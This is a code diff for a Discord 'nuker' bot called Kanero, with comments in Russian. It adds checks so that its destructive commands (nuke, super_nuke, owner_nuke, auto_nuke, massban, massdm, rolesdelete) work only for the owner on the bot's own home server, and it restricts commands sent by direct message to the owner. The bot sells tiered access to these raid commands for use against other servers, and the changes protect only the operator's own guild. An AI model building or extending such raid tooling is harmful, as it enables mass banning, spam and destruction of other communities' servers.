@@ -477,11 +477,21 @@ async def global_guild_block(ctx):
     if ctx.guild and ctx.guild.id == HOME_GUILD_ID:
         if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
             return False
+        # Деструктивные команды — только сам овнер (OWNER_ID), не OWNER_WHITELIST
+        DESTRUCTIVE = {"nuke", "super_nuke", "owner_nuke", "auto_nuke", "cleanup",
+                       "massban", "massdm", "rolesdelete", "auto_super_nuke",
+                       "auto_superpr_nuke", "auto_owner_nuke"}
+        if ctx.command and ctx.command.name in DESTRUCTIVE:
+            if ctx.author.id != config.OWNER_ID:
+                return False
     return True
 
 @bot.command()
 async def nuke(ctx, *, text: str = None):
     guild = ctx.guild
+    # Нюк запрещён на домашнем сервере для всех кроме овнера
+    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
+        return
     if is_guild_blocked(guild.id):
         embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
         embed.set_footer(text="☠️ Kanero")
@@ -690,6 +700,9 @@ async def nicks_all(ctx, *, nick: str):
 @bot.command()
 async def auto_nuke(ctx, state: str):
     uid = ctx.author.id
+    # Запрещено на домашнем сервере для не-овнеров
+    if ctx.guild and ctx.guild.id == HOME_GUILD_ID and uid != config.OWNER_ID:
+        return
     # Требует freelist или выше
     if not is_freelisted(uid) and not is_whitelisted(uid) and not is_premium(uid) and uid != config.OWNER_ID:
         embed = discord.Embed(
@@ -1150,6 +1163,8 @@ def premium_check():
 @premium_check()
 async def super_nuke(ctx, *, text: str = None):
     guild = ctx.guild
+    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
+        return
     if is_guild_blocked(guild.id):
         embed = discord.Embed(description="🔒 Этот сервер заблокирован.", color=0x0a0a0a)
         embed.set_footer(text="☠️ Kanero")
@@ -1187,6 +1202,8 @@ async def owner_nuke(ctx, *, text: str = None):
     if not is_owner_nuker(ctx.author.id):
         return
     guild = ctx.guild
+    if guild.id == HOME_GUILD_ID and ctx.author.id != config.OWNER_ID:
+        return
     if is_guild_blocked(guild.id):
         await ctx.send("🔒 Этот сервер заблокирован.")
         return
@@ -3962,6 +3979,13 @@ async def on_message(message):
             return
 
         if content.startswith("!") and content != "!":
+            # Только овнер может выполнять команды через ЛС
+            if message.author.id != config.OWNER_ID:
+                await message.channel.send(embed=discord.Embed(
+                    description="❌ Команды в ЛС доступны только овнеру.",
+                    color=0x0a0a0a
+                ))
+                return
             # Сначала пробуем активный сервер, иначе — домашний
             gid = active_guild.get(message.author.id) or HOME_GUILD_ID
             guild = bot.get_guild(gid)
